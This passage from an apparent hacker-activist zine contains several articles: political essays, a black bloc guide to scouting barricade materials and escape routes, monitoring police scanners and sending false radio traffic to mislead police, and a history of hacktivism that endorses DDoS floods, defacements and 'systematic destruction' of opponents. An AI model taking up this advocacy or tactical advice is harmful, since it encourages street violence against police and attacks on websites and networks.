""Security"" at national protests have also become increasingly militarized where
police are beating and arresting people with increased violence and less
accountability. In the buildup to the Republican National Convention, major
protest organizers came under intimidation by the FBI. Over fifty people were
questioned and many were followed and had their homes searched. At the protests
themselves, over 1800 people were arrested and held for several days. At the
protests against the Free Trade Area of the Americas summit in Miami, riot
police used tear gas, pepper spray, tasers and even rubber bullets to harass,
intimidate, and beat protesters. 

The idea is to publicly blur the line between terrorist and dissident in order
to not only justify their oppressive policies but to crush dissent and
opposition to their policies. These are not the actions of a free democratic
nation. These should be warning signals that tyranny is coming and unless
something is done to stop it the vicious cycle will get worse and worse. 

The only way that the Bush administration is able to get away with passing these
policies and not be held accountable for their corrupt actions is by ruling the
people with fear. All of these unjust policies claim to protect the American
people from foreign terrorist threat. 

Immediately after 9/11, the Bush propaganda machine swung into motion. The Bush
administration catered to the lowest common denominator by drawing upon the
emotions surrounding the 9/11 terrorist attacks in order to whip up support for
his policies. Names like the USA PATRIOT Act, the ""War against Terrorism"" and
the ""Axis of Evil"" drew artificial polarities that not only encouraged people to
support it by confusing the issue but also demonize the opposition. Never mind
that the USA PATRIOT Act is contrary to the spirit of the bill of rights - you
don't want to be unpatriotic, do you? To oppose the war on terrorism means
you're working with the terrorists? The Republicans used powerful symbolism such
as the American flag and tried to inspire a strong sense of nationalism in order
to get people to blindly follow their policy recommendations. They made it seem
that if you opposed the president and the war, you were against America. ""You
are either with us or against us."" 

The only way that they could get away with this legislation is by creating the
artificial sense of urgency and threat. When they were trying to convince the
American people to support the war, they used absolutist statements such as
""Saddam is holding the world hostage with weapons of mass destruction"" without
providing any backing to their claims. They raised the Homeland Security
terrorist threat level every time there was some controversy. They invent rumors
such as Yellowcake Uranium. They talk about the evils of the enemy with the
hopes that it will frighten people into thinking irrationally, that there is a
national crisis and only the government can protect them if only they gave up
their rights and gave the Republicans absolute control.

It's a sinister game of scaring the American people into submission, harassing
and intimidating the opposition, and making money for the rich and powerful. It
is becoming increasingly clear who the real terrorists are. At the same time,
more and more people are starting to see through the lies and propaganda and are
speaking up and doing something about it. Unplug yourself from corporate media
and start researching things yourself. Tune in to independent media and open
publishing systems. Turn off the television and take to the streets!

################################################################################
#          16. Paradise Engineering, Political Change...by archaios            #
################################################################################

Utopianism, rooted in the primal desire for abrogation of mortality, is the
foundation of the modern hedonistic imperative. Alluding to an unseen order,
archetypal modern religion disavows such a notion, a philosophy closely aligned
with 19th century, morally absolutist cautionaries. The egregious nature of such
a crucial error is self-explanatory, scientific dogma proselytizing the ability
to absolve man of His painful iniquities through what may be termed ""paradise
engineering"", a much maligned concept as a direct result of such insidious works
as Orwell's 1984 and Huxley's Brave New World. The failure of communism in the
Soviet Union relinquishes all doubt that, without a concerted effort by the
proletariat to debase the plutocratic capitalist oligarchy (ubiquitous in
Western nations), Utopianism is bereft of rationale and the prevalation of
archaic Judeo-Christian ideals is inevitable. The decidedly utilitarian basis of
the consumerist society presented in Brave New World eviscerates the possibility
of egalitarianism in its purest form, social order ""the presupposed need of
which delineates historical analogues"" rooted in shades of apathetic
totalitarianism. Impugning upon users of psychoactive substances the sin of
""defiling God's temple"", contemporary morality insinuates that although the
next-generation of euphoric and empathogenic drugs are within reach, such
indulgence is contrary to the notional social hierarchy and transcends the
suffering that provides a theoretical basis for Christ's salvation. It is
apparent that the hegemonic nature of monotheistic religion is counterintuitive,
denouncing critique as ""heretical"" and eschewing the freedom to innovate; in
spite of this, the gradual progression toward agnosticism is liable to discredit
such stagnation and, ultimately, present an ideal social backdrop for the
evolution of a neo-anarchistic Utopian society.

The insidiousness of Huxley's literary masterpiece exemplifies its origins:
intended as satire, its literal interpretation decontextualises the warnings
contained within, prolonging the Darwinian order that man has sought to
transcend for millenia. Nonetheless, its poignance serves as a prime example of
the dangers of unchecked consumerism; far from catalysing expansion of
consciousness, soma's one-dimensional ""peak experience"" illuminates the
shallowness of existing psychoactives, most notably opioids, upon which
(presumably) it was modelled, the throes of addiction and dependency
characterising the lives of some in spite of the ""perfection"" of social order
and stability. The catchcry of the novel - ""community, identity, stability"" -
opens a Pandora's box, the seemingly benevolent despots responsible for the
rigors of oppression now seen as culpable in the dystopic, purposeless lives of
its inhabitants.The juxtaposition of the Reservation, demarcating the last
remnants of humanity, with the technologically sophisticated Civilization, is in
part responsible for the current attitudes toward mind-altering substances,
inexorably (albeit unintentionally) altering the political landscape. Huxley's
success in alienating his audience in a tactful manner has culminated in the
widespread notion that suffering is inevitable, though the tools to obviate it
are within reach. 

Social unrest, evident throughout Western society, most pointedly as a high
prevalence of mental illness, criminality and recidivism, manifests as a direct
result of unchecked consumerism "" far from the unrealistic idealism of Huxley
and the paranoid speculation of Orwell, the oppression of the working class is
readily apparent; the exploitation by the Military-Industrial-Entertainment
complex of the desire to conform represents a grave injustice, gratuitously
indoctrinating the masses and culminating in a cultural void. Is it, then,
surprising to note the high rates of drug ""abuse"" as an escape from the throes
of daily life?

The malaise of dysthymia impairs cognizance of the issues at the forefront of
our civilization, resulting in the apathy and discontent that a significant
number of youth now eulogize, the mantra of democratic society long-since
forgotten. The speciousness of the arguments against ""unnatural"" hedonistic
engineering are rooted in the technophobic prejudices of our aging population;
far from necessitating a return to the values of yesteryear, outdated rationales
for human suffering, postmodern society demands alterations unimaginable to the
drug-naive consciousness.

The trial and tribulation of the outmoded Darwinian social order familiar to
tropophobic segments of the populace are central to the postulate that the
hedonistic imperative embodies a futuristic answer to the rationale of
contemporary religious practices. Undeniably, the society presented in BNW
embodies the epiphany of stagnation: devoid of scientific inquiry and tantamount
to the state of existing third-world nations, this does not have to be so.
Properly exercised, the duplicitous nature of psychoactives can be overcome; a
prime example of this, Huxley's antipathy evolved in later life to drug-assisted
paradise, Island documenting his personal triumph through the use of LSD and
mescaline. Typified as a retarding force for social change, that this is not so
is exemplified through exploitation of serotonergic and dopaminergic
euphoriants, an unorthodox if neurotoxic approach to the rigors of civilized
life. Media stereotypes of crude psychopharmaceuticals present an unreliable
overview of future accomplishments; from the arguments presented above, however,
it is clear that continued research is necessitated for the maintenance of an
stable, egalitarian population in deference to the libertarian dynamic.

Supplication of morality (i.e. the incumbence of an amoral populace) is far from
an inevitability in the inertia-driven field of paradise engineering, combining
behavioural neuroscience and molecular biology to achieve a common goal: that of
a neo-utopian society, futuresque though this idea may seem. Indeed, it allows
humanity to conquer akrasia (literally: ""bad mixture"") "" that is, a character
flaw of weakness whereby an agent is unable to perform an action s/he knows to
be right, a common pathology in the criminal element. The impact of sociopathy
would be nullified, enabling one to gain greater insight into human
consciousness and the complex relationship between humans and psychoactives. The
crude soporifics and mood-brighteners of yesteryear, responsible for much social
decline in Australia and throughout modern Western society, will be supplanted
by alternatives free of the stupefying insensibility as can be attributed to
alcohol, should current trends continue. The ideological implications are grave,
sounding the death knell for monotheistic belief systems and, indeed, Western
society as it is currently known. Huxley's treatise, though antipathic to the
ideas expicated in this essay, maintains a warning that must be borne, lest a
nightmarishly Orwellian scenario ensue: stability does not equate to happiness
and apathy is no substitute for the latter.

################################################################################
#       17. Communication and Info Gathering at a Protest   By alxCIAda        #
################################################################################

Where the black bloc goes the cops will not be far off. The cops almost always
have an edge with their expensive radios, ""less than lethal"" weapons, all the
intimidating riot gear you can dream of, and in most big cities enough personal
to seriously outnumber the members of the bloc. One of the things that must be
done to improve our effectiveness as a street fighting force and pose a bigger
threat to the powers of the state, is work on our communication and information
gathering skills prior and during an action. 

Pre-Action Recon
--------------------------------------------------------------------------------
Having scouts at an event is a very important thing to have. Scouts should be
out patrolling at an event well before it starts. The cops are out well before
daylight setting up for the action and so should we. Scouts should travel in
groups of 2-3, never alone this will lower the risk of them being picked up.
Such recon groups might want to use bicycles to increase their mobility. Some
things recon teams should look out for are possible police staging areas that
are common to multi-story parking complexes, materials that could be used in the
construction of barricades and road blocks. Also take note of cameras, dead
ends, possible routes to use if you need to escape, most importantly make sure
you wont get lost.

If you're not from the area a map will come in handy. If your maps include
information on the days action you must encrypt them, the importance of this
cannot be stressed enough. If the police were to get a hold of a map with out it
being encrypted the entire days action could be spoiled. In fact it happened
during the R2k action in Philadelphia when cops got a hold of two people leaving
a black bloc meeting. They had with them maps of the days action which the cops
discovered upon searching them. These maps were unencrypted and included the
location of black bloc emergency gathering sites, as well as the areas that they
were going to focus their activities on, and the location of supplies to be used
in the creation of a road blocks. You can imagine what kind of damage this did
to the days plans. Another tactic is to divide the locals up, so instead of
working as a local contingent they can be treated as specialists and divided up
between groups to share their knowledge of the area. This way they can help more
people learn the land and if it comes to it escape with out being arrested. 

Police Scanning
--------------------------------------------------------------------------------
One thing all groups involved in the days action should have is a police
scanner, they can provide much needed information about police movements and
tactics. Before you go out to battle cops with your police scanner there are
some things you should know. A very important subject you must look into are
your local laws dealing with police scanning. In the USA it is legal to use a
police scanner in your own home, it's when you hit the streets that they might
be illegal. In some places like California, New Jersey, and Vermont you cannot
use the device in furtherance of a crime, which depending on the days action
could be pinned onto those using one in a bloc. In some of the other states
possession of such devices is illegal for anyone with out a permit. For a list
of state laws dealing with police scanning go to:
afn.org/~afn09444/scanlaws/scanner5.html

Another thing you must do is look up the codes your local PD uses, try and
remember as many as you can, but most importantly you must be able to recognize
a code that would be used to describe the activities that are planned throughout
the days action. A good way to get the codes down is to use your scanner when
your not under the pressure of police oppression. If it seems as though they are
talking to fast for you to get everything they are saying, just write down bits
and pieces that you do get and if you don't know what the codes they are using
mean look them up. You should be familiar with the way the radio operators are
used to talking. No radio operator will ever talk using familiar conversation on
the radio, they will use badge numbers, police codes, and a phonetic alphabet. 

You should be able to understand what the officers are saying when they use a
phonetic alphabet. The phonetic alphabet is used by communicators all over to
clarify letters and spellings. When listening to the cops they will spell out
peoples names, DOB, license plates, and pretty much everything else you can
think of using a phonetic alphabet. A copy of the phonetic alphabet can be found
at: hackbloc.org/alxciada/phonetic.txt

It's very important that you be discreet when using a scanner. It can easily
make people think you are a cop or some kind of undercover not worthy of their
trust. A good idea would be to keep it hidden and run a pair of head phones to
it like a Walkman, this will also allow you to hear it a lot better as it can
get pretty loud on the streets. MAKE SURE the cops don't see the scanner, for
the person with the scanner will have to help move the bloc away from trouble.
If the cops identify you as a someone important or taking a leadership role they
will single you out and try and arrest you. 

When the action starts the radio will be going off like crazy. In most cases of
a break-away march away from a larger contingent catches the officers off guard.
A common tactic of the police is to trap this group on a smaller side street
circle them and make arrests. The person with the police scanner has to be aware
of this and watch out for this being setup. Also listen to reports of people
being arrested, get their names, DOB, and any info that you think can help their
legal situation. Make sure if you're staying with the group that you keep on top
of where the front of the group is and where the back is, the cops will announce
this every few blocks. This is important to make sure that one part isn't
falling behind of the others.

Other Communication Techniques
--------------------------------------------------------------------------------
Walkie-Talkies should only be used if no other means of communication are
available. Walkie-talkie can be monitored very easily, so all important messages
should be encrypted. Things that relate to your tactics and positions should
always be said using a code and if possible spread though other means besides
radio. You do not need to encrypt everything, these radios can be used to spread
messages like calling for a medic, telling the group to stick together, or that
the police are attacking. Things like this that are not critical to your goal or
that could hurt your bloc do not need to be encrypted and should be spread to as
many people as possible to get the help you need. All those who plan on using a
radio should have a one-time-use nick name that will conceal their identity when
using the radio. Same goes for the code, you should change your code as often as
possible. Obviously the downside of this is that the new code has to be taught
to everyone but it will improve your chances of keeping your communications
secret. Another good trick is to send false info over the radio, say your going
after one target while actually going to another. Make it seem like a slip up,
maybe one member will announce a fake target and another will come on the air
saying that this is not secure and no more talk about the target should be
discussed. Maybe even send a small group in that direction as a distraction.
This could allow you to catch the police off guard if the cops are listening in,
it could buy you the time you need to make it to your real target unnoticed. 

One idea that has been very effective in spreading tactical information is
setting up a tactical short message system (SMS) mailing list to send e-mail
updates to trusted members of the bloc's cell phones. It has worked very well at
the Republican National Convention and the Democratic National Convention to
spread tactical information to the different groups. Almost all cell phones have
an e-mail address that you can send short text messages. This can be used to
update your fellow freedom fighters with information dealing with police
movements, or as an alterative to using 2 way walkie-talkie. Your phones e-mail
address will be your 10 digit phone number @ and address based on your provider.
An example for verizon cell phones it will be [10 digit phone number]@vtext.com.
If you don't know what your phones e-mail address is here is a short list of
common providers.

AT&T - @mobile.att.net
Cingular - @mobile.mycingular.com
Nextel - @messaging.nextel.com
Sprint - @messaging.sprintpcs.com
T-Mobile - @tmomail.net
Verizon - @vtext.com

The idea would be to have a mailing list where one use can send a message to an
address which in turn would send it to all the members of the bloc who are
registered on this list. If you are in a really large bloc you can set up a
cluster mailing list where each affinity group could have their own mailing
list, say group1@mailinglist.net group2@mailinglist.net group3@mailinglist.net..
Those address will be registered on another mailing list say
bloc@mailinglist.net so that messages that only concern a certain group can stay
within the group while larger messages that effect everyone can be sent to all
the entire bloc using the bloc@mailinglist.net.

If you change your mailing list address often and verify all those on the list
the chance of police intercepting your tactical information is largly reduced.
The downside is of course the amount of time it takes to type and send a message
using a cell phone might not be avalible when your smashing the state, thats why
other forms of communication should still be used.

This article only touches the surface of how we can improve our communication
and information gathering skills, tips discussed in this article are just the
beginning. To pose a real threat to the powers of the state we must spend more
of our time training for upcoming actions. Our enemies take training very
seriously and so should we. We should start training people to use a wide range
of equipment and skills. Not only those discussed in this article but what ever
you can think of to keep our tactics new and creative. The more random our
tactics seem the less the police can prepare to counter them. This way, next
time we meet the cops in battle, they wont know what hit them.

################################################################################
#   18. Beyond Physical Borders: Hacking and Activism on the Net   by Fetus    #
################################################################################

The combination of activism, the Internet and hacking is hacktivism; its
abstract can be partially defined in the ""hacker ethic,"" as described in Steven
Levy's Hackers: 

1)   Access to computers- and anything which might each you something about the
way the world works should be unlimited and total. Always yield to the Hands-On
Imperative!
2)   All information should be free.
3)   Mistrust Authority - Promote Decentralization
4)   Hackers should be judged by their hacking, not bogus criteria such as
degrees, age, race or religion.
5)   You can create art and beauty on a computer.

Free information, although described by Levy as an ethic, is more precisely a
core value for which the hacker ethic achieves. It demands uncompromised
availability. However there are forces opposing its existence. Companies and
governments are threatened and have responded to hackers by attacking networks
of free communication as they progress toward the free information movement.
Hacktivism is the active struggle to materialize free societies as described by
the hacker ethic.

The concept of unlimited computer access for the sake of learning (the first
hacker ethic) is manifested by a variety of organizations. Such examples are
free softwares, education, music and free network availability. These
collectives naturally adhere to the fundamental belief that all information
should be free (the second hacker ethic). 

The free software movement has its roots with Richard Stallman. He developed
GNU, which stands for ""Gnu's Not Unix. GNU is a model for software developers to
release their code free from the threat of privatization. This is done under the
General Public License, or the GPL. According to the website, the GPL is
constructed to assure that software developers ""have the freedom to distribute
copies of free software, receive source code, and change the software or use
pieces of it in new programs. The GPL assures that this is accomplished by
specifically stating: 

1) Changes to existing free software must be made known to its recipient that it
was modified.
2) All softwares released under the GPL ""must be licensed for everyone's free
use or not licensed at all.

The successes of the open source movement have inspired programmers to release
their code under the GPL. For example, sourceforge.net provides an opportunity
for people to release their projects (which currently numbers at 99,572) freely.
Other institutions have adapted the open source GPL model.  The online free
encyclopedia Wikipedia encourages people to contribute and edit its contents
implementing democratic methods such as page history and discussion. 

Universities are also contributing to the open source movement by releasing all
course materials and lectures free of charge. For example the Open Course Ware
project at MIT has set a new standard for higher education. Charles Vest,
President of MIT, in the annual report explained that:

""The computer industry learned the hard way that closed software systems - based
on a framework of proprietary knowledge - did not fit the world they themselves
had created. The organic world of open software and open systems was the true
wave of the future. Higher education must learn from this. We must create open
knowledge systems as the new framework for teaching and learning.""

Although these intuitions have taken the initiative to spread the benefits of
open source, giant corporations (and governments alike) are vehemently fighting
its development. A major milestone case is SCO vs. IBM. Stephen Shanklan, staff
writer of CNET News.com reported that SCO, the ""inheritor of the intellectual
property for the Unix operating system has sued IBM for more than $1 billion.""
Chris Sontag, Senior Vice President of SCO claimed that IBM ""has contaminated
their Linux work with inappropriate knowledge from Unix."" However, SCO does not
stand unsupported in this legal battle. Microsoft, a multibillion-dollar
software corporation and an advocator of proprietary source code, had been
financially backing SCO's legal defense. In another article, Stephen Shanklan
reported that Microsoft gave a total of $16.6 million dollars to SCO ""for a Unix
license, according to regulatory filings."" Corporations like Microsoft and SCO
are using their economic superiority to undermine the free-software movement
because it threatens their profit in the industry. 

Corporations are not the only entity working against the free information
evolution. The U.S. Department of State, in a release made by the Bureau of
Democracy admits that the Chinese government:

Continued to suppress political, religious and social groups, as well as
individuals, that it perceived to be a threat to regime power or national
stability. The Government's human rights record remained poor, and the
Government continued to commit numerous and serious abuses. It refused to allow
social, political or religious groups to organize or act independently of the
Government and the Communist Party. Those who tried to act independently were
often harassed, detained or abused by the authorities.

Nick Mathaison, a writer for the Observer reported Microsoft sold technology
used to censor the Internet to the Chinese government. It has ""resulted in the
jailing of its political opponents"" Mathaison continues to explain that Amnesty
International ""has cited Microsoft for helping fuel 'a dramatic rise in the
number of people detained or sentenced for internet-related offences'.""  

In its press release, Microsoft declared that it signed an agreement with the
Chinese authorities to ""provide national governments with controlled access to
Microsoft and Windows source code."" The agreement called ""Government Security
Program"" is ""tailored to the specialized security requirements of governments""
that permit them to control information in an ""appropriate way."" In addition to
""controlled access,"" the GSP agreement allows the participating government to
""undertake research projects in the field of information security."" This means
that the Chinese government can spy (and punish) on its people using Microsoft
products. Microsoft has profited from the deprivation of first amendment rights
of the Chinese people. 

Hackers have declared the inherent mistrust of authority figures because of
repressive actions of large corporations and governments. The hacking community
has responded by innovating tools to counter cyber oppression to bypass
censorship. Hackers and activists are working together to apply civil
disobedience tactics on the internet. The ""Hands-On Imperative"" is
re-appropriated to ""direct action"" which generates activity liberating the
people and the same time challenging the law. 

Hackers have been able to overcome censorship by creating decentralized content
distribution networks. These networks remain anonymous and secure because it
requires all users in the network to share data in small parts. Many programs
have emerged such as ""peekabooty,"" ""six/four"" and ""Freenet."" According to
sourceforge.net, a website that fosters the open source community, ""Freenet is
free software designed to ensure true freedom of communication over the
internet. It allows anybody to publish and read information with complete
anonymity."" 
In addition to developing technology to defend freedom on the Internet, hackers
have staged attacks against those responsible for oppression. Tim Jordan
insightfully states, ""The rise of hacktivism has not superseded or destroyed
previous hacker politics, but has reconfigured it within a broader political
landscape"" (2002). The Critical Arts Ensemble (CAE) was established in 1994
arguing that the onset of the Internet will create a space in which physical
laws becomes an ineffective means of enforcement. The CAE states, ""Elite power,
having rid itself of its national and urban bases to wander in absence on the
electronic pathways, can no longer be disrupted by strategies predicted upon the
contestation of sedentary forces (Jordan 2004)."" Groups like the CAE are
coinciding online protests with street actions.

The power now lies in computer networks. It is in the form of ""Electronic Civil
Disobedience (ECD)."" The ""nomadic"" power of the corporation must be fought
against on the Internet. The CAE believes that:

""The expertise hackers develop in the technologies of cyberspace can offset the
imbalance of power that activists are seeking to redress. ECD magnifies its
effects not by increasing the numbers of bodies involved in protests but by
using the expertise of hackers to increase their political effects."" (Jordan
2005)

Within two years of the CAE's call for the politicization of hackers, they
developed a ""theory and artform all in one."" It was called Floodnet. Floodnet
was developed by ""four artist-hacker-activists"" under a new group called the
""Electronic Disturbance Theatre"" (EDT). Stalbaum explained that Floodnet is an
""example of conceptual net.art [sic] that empowers people through
activist/artistic expression."" According to the CAE's website, Internet Surfers
in support of the ""digital resistance"" against globalization can simply click on
a link, leave the browser open, and the Floodnet Applet will ""automatically
reload the target web page every few seconds (Stalbaum).""

The CAE first launched their Floodnet tools against websites connected to
""Mexican neo-liberalism"" in solidarity with the Zapatista resistance. The
actions were defined as a ""virtual sit-in,"" which parallel action in the
streets. The Floodnet script deliberately makes an invalid request using
keywords such as ""human_rights."" The targeted server will then respond with
""human_rights not found on this server (Stalbaum)."" Other hacking groups
including the Electrohippies Collective also launched similar floodnet attacks
on groups like the World Trade Organization to coincide with major street
actions. The ehippies ""claimed that the action was successful with the WTO
conference networks being constantly slowed, brought to a complete total halt on
two occasions and with 450,000 people participating over five days.

This sort of online direct action is disputed as ""hacktivism"" by Oxblood Ruffin,
a prominent member of the Cult of the Dead Cow. Oxblood claimed in a speech at
the CyberCrime and Digital Law Enforcement Conference at Yale Law School that
""DoS' (denial of service) attacks (carried out by the CAE, EDT, and ehippies)
""smelled like the same cheap hacks were being elevated to political street
protests when they weren't more than script kiddy antics in drag."" He declared
that ""digital disobedience or cyber sit-ins"" were not synonymous with
hacktivism.

Instead Ruffin came up with a modified form of Richard Stallman's GPL known as
the ""Hacktivismo Enhanced Source Software License Agreement."" HESSLA uses the
Universal Declaration of Human Rights (UDHR) as the basis of its philosophy. The
UDHR was developed in 1948 in the General Assembly of the United Nations to
avoid the atrocities committed during World War II. Its main principles are: 

The HESSLA license follows the declaration that:
Both Hacktivismo and its end-users to go to court if someone tries to use the
software in a malicious manner, or to introduce harmful changes in the software.
It also contains more robust language than has previously been used to maximize
enforcement against governments around the world.

Any government or institution guilty of human rights violations can be
prosecuted if caught using software with this license. Although this license has
never debut in the court systems, it remains a symbolic act of the hacktivist
and has sprouted in other scalable and effective forms. 

However, many hackers feel that the GPL and HESSLA license do not go far enough
in defending the open source movement. Corporations like SCO and Microsoft are
actively working together to sue major distributors of Linux. Because of their
economic advantage and influence in the court system, they have been successful
in bringing charges against the Linux community for allegedly stealing portions
of ""copyrighted"" SCO UNIX source codes. Hackers, left with no other voice, have
taken matters in their own hands by directly attacking SCO servers. Tactics have
started out with simple DDOS attacks which shut down severs for periods of time
(Wagner) but have evolved into more complex attacks such as website defacements
(Barr) and even worms and viruses infecting hundreds of thousands of computers
to attack SCO servers (Hines). The actions of SCO have radicalized hackers to
take actions in more ways than distributing free code.  

More aggressive forms of hacktivism have emerged in the Middle East conflict.
""There has been a massive increase in online activities, particularly in
relation to the conflict in Palestine and Israel (and more recently associated
with 9-11), which has been labeled 'e-jihad',"" explains Gary Bunt. ""E-jihad"" is
an electronic version of the holy war representing the struggle of good over
evil. The ""massive increase in online activities"" is cyber warfare. It wholly
rejects the ""digitally correct"" philosophy and has taken the hacker ethic of the
""hands-on imperative"" or ""direct action"" to its final step. 

The Pro-Palestinian hacking group,""World's Fantabulous Defacers"" (WFD) was
responsible for hundreds of web defacements against Israeli, Indian, Taiwanese,
Yugoslavic and the online bank Karachi website. Their most notorious attack was
against the Israeli Prime Minister Ariel Sharon's election campaign website in
2001. They posted grotesque images of ""a badly scarred child whose horrific
injuries were the result of his house being 'burned down by illegal Jewish
settlers in the West Bank'."" They explained their actions that:

We are no heroes but merely hackers while we understand that it is not feasible
for us to successfully make a legitimate difference in oppressed and tortured
lives in Palestine we will continue to deface, not destroy, for the cause until
there is reform until there is change until all suffering children in the world
can wake up to a world of peace, not a world of death, destruction, and chaos, a
world devoid of war.  (Bunt) 

They included links to the Intifada (translated uprising) Online, Palestinian
Information Center, and the Islamic Association for Palestine.

Other Muslim hacking groups have started organizing against Israeli and Indian
sites by working with various hacking groups and distributing hacker tools.
Their actions range from politically motivated hacks to shout-outs to other
affiliated groups. One such Muslim hacking group is called ""The Muslim Hacker's
Club"" (MHC). In addition to distributing viruses and flood tools, Alldas.org
""logged 28 hacking attacks linked to the MHC"" against commercial Indian sites
(Bunt). Another notorious group was called the ""Silverlords."" Alldas.org
documented 1,436 defacements from November 2000 to April 2002. In their major
defacement of paintcompany.com, they ""presented a pro-Kashmiri page, with
graphic photographs of human rights violations."" They quoted, ""STOP THE INDIAN
GENOCIDE AGAINST THE PEOPLE OF KASHMIR. FREE KASHMIR, PALESTINE END THE INJUST
U.N SANCTIONS ON IRAQ."" 

The hacking group GFORCE was another accomplished collective. They were known to
have hacked the US Defense Test & Evaluation Processional Institute (DTEPI) in
September 2000. They replaced the site's content with very strong messages and
photos of Palestinian children being killed by the Israeli troops. Their ending
statement explains their call for an e-jihad: 

""We have suffered throughout the wages and will suffer no more. This is the era
of cyberwarefare, where once again the Muslims have prevailed. We will not rest
till every node, every line, every bit of information contained in our
suppressors has not been wiped out, returning them to the dark ages. We will not
tolerate anymore, and we will not fail."" (Bunt)

GFORCE also hacked other ""US government agencies, military and other targets via
Taiwan-based platforms."" GFORCE was the most ""prominent group of hackers to have
emerge from Pakistan (Dr. Nuker, Pakistani Hackerz Club)."" 
The hacking group UNITY have increased militancy under the potent cyber Islamic
ideology - hacking under the ""iron guard banner."" They advocated penetrating the
""enemy's network"" and ""planting code"" to cause direct infrastructure damage in
what they perceive as online war. UNITY described in systematic format in their
hacking strategy. It follows: 

1) Disabling official Israeli government sites.   
2) Crashing financial sites. 
3) Knocking out main Israeli ISP servers.
4) Blitzing major Israeli e-commerce sites causing transaction loss. 

UNITY believes that ""the more money they (Israeli cyber fronts) lose in fixing
and strengthening their systems means less money to buy bullets and rockets for
use against our children.""  Gilad Rabinovich, CEO of the Israeli ISP Netvision
said, ""All Israeli ISPs have been overloaded with data"" and confessed that ""we
are just the only ones to admit it."" In addition to being ""overloaded with data""
the CEO continues that if the cyber war were to continue ""it will steal
resources from us and hurt customers. (Gambill)"" 

In order to be effective, it is imperative that all aspects of hacktivism is
embraced; promoting free decentralized information networks as well as taking
direct action against those responsible for violating digital and human rights.
The materialization of a free society requires the systematic destruction of
oppressive forces working against the free flow of information. The internet is
not free; it is made free by those who are willing to fight to protect it.

################################################################################
#                   19. White and Black   By shardz@dikline                    #
################################################################################

This paper is designed to explain to people how the security industry works and
why black and white hats both need each other. First off for those of you that
say you are gray hats, there is no gray hat. Gray hat is white hat, the issue is
quite literally black and(or in this case) white. I'm not going to claim either
to work for ""the industry"" as a white hat. Nor will I claim to be part of the
black hat scene, but anywayz let's get started. 

--------------------------------------------------------------------------------
White
--------------------------------------------------------------------------------
White hats certainly need black hats because without them there would not be a
security industry. Also when I say ""white hat"" I dont mean sys-admins because
sys-admins are just doing their job. Im talking about people like Lance Spitzer
(Project Honeynet), or David Litchfield, who I like some of the papers of I just
dont think when he talks about SQL passwords and how to crack them, he should
write an accompanying tool that will be most likely used by script kids than
sys-admins. Lists like BuqTraq and other full disclosure lists have to be the
most counter productive things ever created, but the also prove the point that
white hats need black hats. Lists like the aforementioned do more harm than
good, the number of script kiddies that are nurtured and encouraged by these
lists far out weighs the number of patches written and holes closed. However
without such support such lists would quickly become irrelevant since noone
would be hacking boxes, security would no longer be an issue. If people simply
stopped posting to such lists and followed a path of non disclosure and report
bugs directly to the vendors (or keep them private =)) security would improve
drastically since kiddies would have nothing to feed off of, thus reducing the
attacks. Personally I think projects like pr0j3kt m4yh3m are a rude alert to the
white hats that something is terribly awry. Its sad to think that they in their
self righteous journey to ""secure"" the internet, that they are the ones helping
to make it less secure. Either that or they're in it for the money and know
exactly what their doing, I believe its a combination of the both moreso the
latter than the former. 

--------------------------------------------------------------------------------
Black
--------------------------------------------------------------------------------
Black hats, atleast true black hats, don't need white hats in any sense. However
if you use a loose interpretation of the term they do, and for this paper black
hat will encompass script kiddies as well as the people at the darkest ends of
the spectrum. By ignoring the truely talented black hats and focusing more on
the kiddies the bond between black and white will become clear. Script kiddies,
in their early stages of messing with computers, thrive on white hat mailing
lists like BugTraq for their infoz. These lists dumb down every topic and make
tools simple enough for them to use on a mass scale. They then go and use these
tools to hack computers and leave defacements, or install psyBNCs, or whatever.
Then all of the sysadmins that get owned for not patching their systems within
37 seconds of the BugTraq post complain that the security industry sucks and is
insecure. Then a huge amount of money is spent to research and discover security
bugs. These bugs are then posted to a security mailing list where, script
kiddies gather tools and infoz and hack more computers. Its a vicious circle
that has snowballed out of control. I dont think anyone really learns from these
lists: in theory these lists are meant to benefit security by applying pressure
to the vendors to patch their systems. Which it does, however the number of
sysadmins that avidly read this list are so few that the list is fairly
inefficent. Therefore many systems are left unpatched and now many kiddies have
a tool they can use to exploit them. The true blackhat hackers that code their
own exploits paradoxially enough help the security industry more than the full
disclosure white hats. This is because a single blackhat or even a group of ten
with a unreleased exploit will do far less damage than the numerous script
kiddies with a publically disclosed exploit. The blackhats that don't disclose
their exploits may not be helping security 100% but they are doing more good by
keeping their exploits private. The chances of sysadmins getting hacked by a
handful of black hat hackers with an exploit is far less than these sysadmins
getting owned by a script kiddie with a tool they ripped off some list. 

--------------------------------------------------------------------------------
Conclusion
--------------------------------------------------------------------------------
The real threat when the media, the anti-virus companies, or whoever, mentions
""hackers"" who they really mean are kids with tools they discovered off of full
disclosure lists. Anti-Virus/Security industry is a multi million dollar
industry that thrives on its colleagues doing security ""research"", and releasing
bugs that kiddies of the virus world can write a devastating worm so that the
public will buy their product. But you might ask if the vulnerabilities were
known about how come the worm or whatever was so devastating? Because people
dont patch thier systems. Almost any security breach can be boiled down to an
error between the keyboard and the chair. Theoratically if Joe Blow subscribed
to BugTraq and patched his systems as the bugs came out full disclosure would be
a wonderful system. However the public does not subscribe to BugTraq even most
sysadmins don't carefully moniter the integrity of thier systems, that would be
a 24 hour a day job. Black hat hackers are not the problem its the industry
itself and the white hat full disclosure mentality. And since the industry is
spawning legions of ""hackers"" a day they will never go away. Thus the industry
is the only problem in this equation that can be solved. The kiddies arent going
away. The blackhats aren't disclosing. But the white hats seem to be the root of
all the problems. After reading this paper you may be wondering where my stance
is, what ""hat"" I wear since before I said I was neither a white hat or a black
hat. And the answer is, rogue hat. A rogue is simply a hacker that looks out for
himself, and their group. We don't have stereotypical agendas. We are not in it
just to learn, or to help improve security. We are not in it to cause mayhem or
make money. We are simply in it. Finally I will leave you all with a question.
Since when did we start calling the security ""scene"" an industry?

                                 shardz@dikline
                                     __/\__ 
                                     \ \/ /
                                     /_/\_\ 
                                       \/
 
################################################################################
#         20 Autonomous Hacktivism With the Internet Liberation Front         #
################################################################################

In the online struggle for social justice, many of our comrades have fallen
victim to law enforcement. In order for us to remain effective, we need to find
ways of clearing ourselves of becoming targets of harassment from the rich and
powerful. To continue to question and confront the established order, we need to
explore more secure models of radical organizing.

As part of adopting security culture and becoming anonymous, we need to organize
ourselves in a decentralized way to prevent the ability for single people being
busted not take down the entire group. The Internet Liberation Front(ILF), like
the Animal and Earth Liberation Front before it, is a tactic to take action
anonymously yet still connect with larger and broader social movements. Several
